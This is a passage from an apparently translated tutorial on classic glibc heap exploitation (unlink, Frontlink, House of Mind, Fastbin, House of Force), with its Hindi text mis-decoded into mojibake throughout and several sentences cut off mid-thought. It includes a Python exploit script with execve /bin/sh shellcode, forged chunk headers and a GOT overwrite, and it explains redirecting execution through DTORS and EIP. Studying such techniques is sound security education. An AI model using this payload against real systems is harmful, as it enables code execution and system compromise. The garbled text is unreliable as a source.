рдкреНрд░рдХрд╛рд░, рдЬрдм free() рдЬрд╛рдВрдЪреЗрдЧрд╛, рд╡рд╣ рддреАрд╕рд░реЗ рдЪрдВрдХ рдХреЗ size рдкрд░ рдЬрд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рджреВрд╕рд░реЗ рдЪрдВрдХ - 4 рдкрд░ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ рджреВрд╕рд░рд╛ рдЪрдВрдХ рдлреНрд░реА рд╣реИред рдФрд░ рдлрд┐рд░ рд╡рд╣ **unlink()** рдХреЛ рдмреБрд▓рд╛рдПрдЧрд╛ред

unlink() рдХреЛ рдмреБрд▓рд╛рдиреЗ рдкрд░, P->fd рдХреЗ рд░реВрдк рдореЗрдВ рджреВрд╕рд░реЗ рдЪрдВрдХ рдХреЗ рдкрд╣рд▓реЗ рдбреЗрдЯрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╡рд╣рд╛рдВ рдЖрдкрдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП - 12 (рдХреНрдпреЛрдВрдХрд┐ FD->bk рдореЗрдВ FD рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдкрддреЗ рдореЗрдВ 12 рдЬреЛрдбрд╝ рджреЗрдЧрд╛)ред рдФрд░ рдЙрд╕ рдкрддреЗ рдкрд░ рджреВрд╕рд░рд╛ рдкрддрд╛ рдбрд╛рд▓реЗрдВрдЧреЗ рдЬреЛ рджреВрд╕рд░реЗ рдЪрдВрдХ рдореЗрдВ рдорд┐рд▓реЗрдЧрд╛, рдЬреЛ рд╣рдореЗрдВ рд╢реИрд▓ рдХреЛрдб рдХреЗ рдкрддреЗ (P->bk рдирдХрд▓реА) рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд╛рд╣рд┐рдПред

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes of padding**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<IтАЭ, 0xfffffff0) #рдкрд┐рдЫрд▓реЗ рдЪрдВрдХ рдлреНрд░реА рд╣реЛрдиреЗ рдХрд╛ рдмрд┐рдЯ 1 рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**

**fake\_size = pack("\<IтАЭ, 0xfffffffc) #-4, рддрд╛рдХрд┐ 3 рд╡реЗрдВ рдЪрдВрдХ рдореЗрдВ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ 2 рд╡реЗрдВ рдЪрдВрдХ рдлреНрд░реА рд╣реИ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рд╡рд╣рд╛рдВ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдкрд┐рдЫрд▓реЗ рдЪрдВрдХ рдлреНрд░реА рд╣реИ**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #рдкреЗрд▓реЛрдб рдореЗрдВ рд╣рдо рдкрд╣рд▓реЗ рд╕реЗ рд╣реА 8 рдмрд╛рдЗрдЯ рд░рд┐рдХреНрддрд┐ рдбрд╛рд▓реЗрдВрдЧреЗ**

**got\_free = pack("\<I", 0x08048300 - 12) #free() рдХрд╛ рдкрддрд╛ plt-12 (рдпрд╣ рдкрддрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрдЧрд╛ рдЬрдм free() рдХреЛ рджреВрд╕рд░реА рдмрд╛рд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #рдЬреИрд╕рд╛ рдХрд┐ рдХрд╣рд╛ рдЧрдпрд╛ рдерд╛, рдкреЗрд▓реЛрдб 8 рдмрд╛рдЗрдЯ рд░рд┐рдХреНрддрд┐ рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #рджреВрд╕рд░реЗ рдЪрдВрдХ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, got\_free рдкрддрд╛ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣рдо addr\_sc + 12 рдкрддрд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░реЗрдВрдЧреЗ**

**os.system("./8.3.o " + payload)**

**unset() рдХреЛ рдЙрд▓реНрдЯрд╛ рдХрд░рдХреЗ (wargame)**

рд╣рдо 3 рд▓рдЧрд╛рддрд╛рд░ рдЪрдВрдХ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЙрд▓реНрдЯреЗ рдХреНрд░рдо рдореЗрдВ рдЫреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВред

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ:

рдЪрдВрдХ c рдореЗрдВ рд╢реИрд▓ рдХреЛрдб рдбрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИ

рдЪрдВрдХ a рдХрд╛ рдЙрдкрдпреЛрдЧ b рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕рдХреЗ size рдореЗрдВ PREV_INUSE рдмрд┐рдЯ рдЕрдХреНрд╖рдо рд╣реЛ рдФрд░ рдЪрдВрдХ a рдлреНрд░реА рд╣реИ рдпрд╣ рд╕реЛрдЪреЗрдЧрд╛ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╣реЗрдбрд░ b рдореЗрдВ size рдХреЛ -4 рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ "a" рдлреНрд░реА рд╣реИ рдФрд░ рдПрдХ рдмрд┐рди рдореЗрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╡рд╣ unlink() рдХреЛ рдмреБрд▓рд╛рдПрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреНрдпреЛрдВрдХрд┐ PREV_SIZE рд╣реЗрдбрд░ -4 рд╣реИ, рд╡рд╣ рд╕реЛрдЪреЗрдЧрд╛ рдХрд┐ "a" рдЪрдВрдХ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ b+4 рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИред рдЕрд░реНрдерд╛рдд, рд╡рд╣ b+4 рдореЗрдВ unlink() рдХрд░реЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП b+12 рдореЗрдВ "fd" рдкреЙрдЗрдВрдЯрд░ рд╣реЛрдЧрд╛ рдФрд░ b+16 рдореЗрдВ "bk" рдкреЙрдЗрдВрдЯрд░ рд╣реЛрдЧрд╛ред

рдЗрд╕ рддрд░рд╣, рдпрджрд┐ рд╣рдо bk рдореЗрдВ рд╢реИрд▓ рдХреЛрдб рдХрд╛ рдкрддрд╛ рдФрд░ fd рдореЗрдВ "puts()" рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ -12 рдбрд╛рд▓реЗрдВрдЧреЗ, рддреЛ рд╣рдорд╛рд░реЗ рдкреЗрд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

**Frontlink рддрдХрдиреАрдХ**

рдЬрдм рдХреБрдЫ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдХреЛрдИ рдЖрд╕рдиреНрди рдЪрдВрдХ рдореБрдХреНрдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ unlink() рдХреЛ рдирд╣реАрдВ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рд╕реАрдзреЗ frontlink() рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЙрдкрдпреЛрдЧреА рд╕рдВрдХрдЯ рдЬрдм рд╡рд╣ malloc рд╣реИ рдЬрд┐рд╕реЗ рдХрднреА рдореБрдХреНрдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (free())ред

рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

рдПрдХ рдмрдлрд░ рдЬрд┐рд╕реЗ рдЗрдирдкреБрдЯ рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдУрд╡рд░рдлрд╝реНрд▓реЛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ

рдЗрд╕рдХреЗ рдкрд╛рд╕ рдПрдХ рд╕рдВрдпреБрдХреНрдд рдмрдлрд░ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЬрд┐рд╕рдХреЗ рд╣реЗрдбрд░ рдХреЗ рдлрд╝реАрд▓реНрдб fd рдХреЛ
рдЗрд╕ рддрд░рд╣ рд╕реЗ, рд╣рдо рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП 0x0804a000 рдкрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **0x081002a0** рдкрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реЛрдиреЗ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рд╣рдо 0x08100000 рдкрддрд╛ рдкрд░ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬреЛ рдЪрд╛рд╣реЗрдВ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **0x0804a000**ред рдЬрдм рдпрд╣ рджреВрд╕рд░рд╛ рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рд╣реЛрдЧрд╛, рддреЛ рдпрд╣ рдкрд╛рдпреЗрдЧрд╛ рдХрд┐ heap\_for\_ptr(ptr)->ar\_ptr 0x08100000 рдореЗрдВ рд▓рд┐рдЦрд╛ рд╣реБрдЖ рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ 0x081002a0 рдкрд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рдкрд╣рд▓реЗ рд╣рдордиреЗ рджреЗрдЦрд╛ рд╣реИ рдФрд░ рдЙрд╕рд╕реЗ рдкрд╣рд▓реЗ 4 рдмрд╛рдЗрдЯ рдХреЗ рдорд╛рди, ar\_ptr рдХреЛ рдирд┐рдХрд╛рд▓рддрд╛ рд╣реИ)

рдЗрд╕ рддрд░рд╣ рд╕реЗ \_int\_free(ar\_ptr, mem) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рдд **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
тАж\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ рдкрд╣рд▓реЗ рджреЗрдЦрд╛ рд╣реИ, рд╣рдо av рдХреЗ рдорд╛рди рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╡рд╣ рд╣реИ рдЬрд┐рд╕реЗ рд╣рдо рдореБрдХреНрдд рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд▓рд┐рдЦрддреЗ рд╣реИрдВред

рдЬреИрд╕рд╛ рдХрд┐ unsorted\_chunks рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рд╣рдо av->bins\[2] рдореЗрдВ \_\_DTOR\_END\_\_-12 рдХрд╛ рдорд╛рди рд▓рд┐рдЦрддреЗ рд╣реИрдВ, рддреЛ рдЕрдВрддрд┐рдо рдирд┐рд░реНрджреЗрд╢рдирд╛рддреНрдордХ рдореЗрдВ рд▓рд┐рдЦрд╛ рдЬрд╛рдПрдЧрд╛ \_\_DTOR\_END\_\_ рдХрд╛ рдкрддрд╛ рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдкрддрд╛ рд╣реЛрдЧрд╛ред

рдЕрд░реНрдерд╛рдд, рдкрд╣рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рд╣рдореЗрдВ рд╢реБрд░реБрдЖрдд рдореЗрдВ рдмрд╛рд░-рдмрд╛рд░ \_\_DTOR\_END\_\_-12 рдХрд╛ рдкрддрд╛ рд▓рд┐рдЦрдирд╛ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╡рд╣рд╛рдВ рд╕реЗ av->bins\[2] рдирд┐рдХрд╛рд▓реЗрдЧрд╛

рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХреЗ рдкрддреЗ рдкрд░ рдЬрд╣рд╛рдВ рдЗрд╕рдХреЗ рдЕрдВрддрд┐рдо 5 рд╢реВрдиреНрдп рд╣реЛрдВрдЧреЗ, рд╣рдореЗрдВ рдЗрд╕ рдкрд╣рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдХреЗ рдкрддреЗ рдХрд╛ рдкрддрд╛ рд▓рд┐рдЦрдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ heap\_for\_ptr() рд╕реЛрдЪреЗ рдХрд┐ ar\_ptr рдкрд╣рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╣реИ рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рд╡рд╣ av->bins\[2] рдирд┐рдХрд╛рд▓реЗрдЧрд╛

рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдФрд░ рдкрд╣рд▓реЗ рдХреЗ рдХрд╛рд░рдг рд╣рдо prev\_size рдХреЛ рдПрдХ рдЬрдВрдк 0x0c рдХреЗ рд╕рд╛рде рдФрд░ size рдХреЛ -> NON\_MAIN\_ARENA рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рд▓рд┐рдЦрддреЗ рд╣реИрдВ

рдЗрд╕рдХреЗ рдмрд╛рдж рдЯреБрдХрдбрд╝реЗ 2 рдореЗрдВ рд╣рдо рдмрд╣реБрдд рд╕рд╛рд░реЗ nops рдФрд░ рдЕрдВрдд рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рд▓рд┐рдЦрддреЗ рд╣реИрдВ

рдЗрд╕ рддрд░рд╣ рд╕реЗ \_int\_free(TROZO1, TROZO2) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ \_\_DTOR\_END\_\_ рдХреЗ рдкрддреЗ рдХреЛ TROZO2 рдХреЗ prev\_size рдХреЗ рдкрддреЗ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢рд╛рдВрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рд╢реЗрд▓рдХреЛрдб рдкрд░ рдЙрдЫрд╛рд▓ рдХрд░реЗрдЧрд╛ред

рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рдЕрдзрд┐рдХ рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ рдкреВрд░реА рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП рдЬреЛ рдкреЗрд▓реЛрдб рдХреЛ рдереЛрдбрд╝рд╛ рдФрд░ рдЬрдЯрд┐рд▓ рдмрдирд╛рддреА рд╣реИрдВред

рдпрд╣ рддрдХрдиреАрдХ рдЕрдм рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣рд╛рдВ рдЕрдирд▓рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рд▓рдЧрднрдЧ рд╡рд╣реА рдкреИрдЪ рд▓рд╛рдЧреВ рд╣реБрдЖ рд╣реИред рдпрд╣ рддреБрд▓рдирд╛ рдХреА рдЬрд╛рддреА рд╣реИ рдХрд┐ рдирдИ рд╕рд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдХреНрдпрд╛ рд╡рд╣ рднреА рдЙрд╕реЗ рджреЗрдЦ рд░рд╣рд╛ рд╣реИред

**Fastbin**

рдпрд╣ The house of mind рдХрд╛ рдПрдХ рд░реВрдкрд╛рдВрддрд░рдг рд╣реИ

рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕реЗ \_int\_free() рдХреЗ рдкрд╣рд▓реЗ рдХреА рдЬрд╛рдВрдЪ рдХреЗ рдмрд╛рдж рдкрд╣реБрдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИред

fb = &(av->fastbins\[fastbin\_index(size)] тАФ> рдЬрд╣рд╛рдВ fastbin\_index(sz) тАФ> (sz >> 3) - 2

тАж

p->fd = \*fb

\*fb = p

рдЗрд╕ рддрд░рд╣ рд╕реЗ, рдпрджрд┐ рд╣рдо "fb" рдореЗрдВ GOT рдореЗрдВ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рджреЗрддреЗ рд╣реИрдВ, рддреЛ рдЙрд╕ рдкрддреЗ рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП, рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдЧрд╛ рдХрд┐ рдПрд░рд┐рдирд╛ dtors рдХреЗ рдкрддреЛрдВ рдХреЗ рдирд┐рдХрдЯ рд╣реЛред рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, av->max\_fast рдЙрд╕ рдкрддреЗ рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рд╣рдо рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

The House of Mind рдХреЗ рд╕рд╛рде рд╣рдордиреЗ рджреЗрдЦрд╛ рдХрд┐ рд╣рдо рдПрд╡реА рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВред

рддреЛ рдпрджрд┐ рд╣рдо size рдлрд╝реАрд▓реНрдб рдореЗрдВ 8 + NON\_MAIN\_ARENA + PREV\_INUSE рдХрд╛ рдЖрдХрд╛рд░ рдбрд╛рд▓рддреЗ рд╣реИрдВ -> fastbin\_index() рд╣рдореЗрдВ fastbins\[-1]
**рдмреЗрд╕рд┐рдХ рд▓рд┐рдирдХреНрд╕ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯрд┐рдВрдЧ**

рдпрджрд┐ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рдкреВрдЫрддрд╛ рд╣реИ, рддреЛ рд╣рдо 48 рджрд░реНрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ malloc рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░ рдХреЛ рдмрджрд▓рддреЗ рд╣реБрдП рдЕрдЧрд▓реЗ 4 рдмрд╛рдЗрдЯреНрд╕ рдкрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреЛ рднрд╛рдЧреАрджрд╛рд░реА рдХреЗ рд╕рд╛рде EBP рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рддрд░рд╣ 48 рдкреАрдЫреЗ рд░рд╣ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдпрд╣ рд╕рд╛рдЗрдЬрд╝ рд╣реЗрдбрд░ рд╣реЛ рд░рд╣рд╛ рд╣реИ)ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, ptr-4+48 рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рд╢рд░реНрддреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП (рдЬрд╣рд╛рдВ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ ptr=EBP рд╣реИ), рдЕрд░реНрдерд╛рддреН, 8 < ptr-4+48 < av->system_mem рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред

рдпрджрд┐ рдпрд╣ рдкреВрд░рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдордиреЗ рдХрд╣рд╛ рдерд╛ рдХрд┐ malloc(40) рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕реЗ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ EBP рдХрд╛ рдкрддрд╛ рдХрд┐рд╕реА рдкрддреЗ рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рд╣рдорд╛рд░реЗ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЗрд╕ malloc рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХрд╛ рднреА рдирд┐рдпрдВрддреНрд░рдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рд╡рд╣ EBP рдФрд░ EIP рджреЛрдиреЛрдВ рдХреЛ рд╡рд╣ рдЪрд┐рд╣реНрдирд┐рдд рдкрддреЗ рдХреЗ рд╕рд╛рде рдЕрдкрдиреА рдкрд╕рдВрджреАрджрд╛ рдкрддрд╛ рдкрд░ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕рд▓рд┐рдП рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рддрд░рд╣, рдЬрдм рдЗрд╕реЗ рдореБрдХреНрддрд┐ рдорд┐рд▓реЗрдЧреА (free()), рддреЛ рдпрд╣ рд░рдЦреЗрдЧрд╛ рдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ EBP рдкрддреЗ рдХреЗ рд▓рд┐рдП рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдкрддреЗ рдореЗрдВ рдПрдХ рдкреВрд░реНрдг рдЖрдХрд╛рд░ рдХрд╛ рдЯреБрдХрдбрд╝рд╛ рд╣реИ рдЬреЛ рдирдП malloc() рдХреЗ рд▓рд┐рдП рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЗрд╕рд▓рд┐рдП рд╡рд╣ рдЙрд╕ рдкрддреЗ рдХреЛ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рддрд╛ рд╣реИред

**рдлреЛрд░реНрд╕ рдХрд╛ рдШрд░**

рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИ:

* рдПрдХ рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдУрд╡рд░рдлрд╝реНрд▓реЛ рдЬреЛ wilderness рдХреЛ рдмрджрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЖрдХрд╛рд░ рдХреЗ рд╕рд╛рде malloc() рдХреЛрд▓
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде malloc() рдХреЛрд▓

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ wilderness рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЖрдХрд╛рд░ рдмрд╣реБрдд рдмрдбрд╝реЗ рдорд╛рди (0xffffffff) рдХреЗ рд╕рд╛рде рдУрд╡рд░рдлрд╝реНрд▓реЛ рдХрд░рдирд╛, рдЗрд╕ рддрд░рд╣ рдХреЛрдИ рднреА рдореЗрдореЛрд░реА рдЕрдиреБрд░реЛрдз рдЬреЛ рдкрд░реНрдпрд╛рдкреНрдд рдмрдбрд╝рд╛ рд╣реЛрдЧрд╛, рд╣реАрдк рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд┐рдП рдмрд┐рдирд╛ _int_malloc() рдореЗрдВ рд╡реНрдпрд╡рд╕реНрдерд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рджреВрд╕рд░рд╛ рд╣реИ av->top рдХреЛ рдмрджрд▓рдирд╛ рддрд╛рдХрд┐ рдпрд╣ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдПрдХ рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░реЗ, рдЬреИрд╕реЗ рдХрд┐ рд╕реНрдЯреИрдХред av->top рдореЗрдВ \&EIP - 8 рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ред

рд╣рдореЗрдВ av->top рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

victim = av->top;

remainder = chunck_at_offset(victim, nb);

av->top = remainder;

